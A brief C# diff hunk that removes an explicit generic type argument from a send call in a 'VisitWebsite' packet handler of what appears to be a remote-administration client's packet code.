@@ -23,7 +23,7 @@ namespace xClient.Core.Packets.ServerPackets
 
         public void Execute(Client client)
         {
-            client.Send<VisitWebsite>(this);
+            client.Send(this);
         }
     }
 }
